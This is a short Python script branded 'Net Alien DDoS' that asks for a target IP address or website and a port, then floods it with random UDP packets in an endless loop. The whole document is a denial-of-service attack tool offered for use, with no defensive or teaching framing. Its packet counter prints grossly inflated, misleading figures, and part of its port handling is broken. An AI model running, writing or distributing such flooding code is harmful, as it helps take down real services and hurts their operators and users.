import os,sys,time
import socket
import random
from six.moves import input as raw_input

os.system("cls")
os.system("color a")
os.system("title Net Alien DDoS - By LolWare95")
print("""

  )\  )\   )\.---.   )\__.__        /`-.    /')       /(   )\.---.   )\  )\ 
 (  \/ /  (   .-._( ) _  __ (     .' _  \  ( /       \  ) (   .-._( (  \/ / 
  ) \ (    \  '-.   \( |(  )/    (  '-' (   ))       ) (   \  '-.    ) \ (  
 ( ( \ \    ) .-`      ) \        )   _  )  )'._.-.  \  )   ) .-`   ( ( \ \ 
  ))  ) )  (  ``-.     \ (       (  /  ) \ (       )  ) \  (  ``-.   ))  ) )
 (_/  \_(   ).--.(      )/        )/    )/  )/.___/    )/   ).--.(  (_/  \_(
                 
""")
ip = raw_input("IP Address/Website : ")
port = input("Port  : ")
udp = socket.getprotobyname('udp')
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
send_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, udp)
bytes = random._urandom(1490)
send = 0
while True:
     sock.sendto(bytes, (ip,port))
     send = send + 100000000000
     port = port + 0
     print("send %s packet on %s port %s"%(send,ip,port))
     if port == 65534:
        port = 0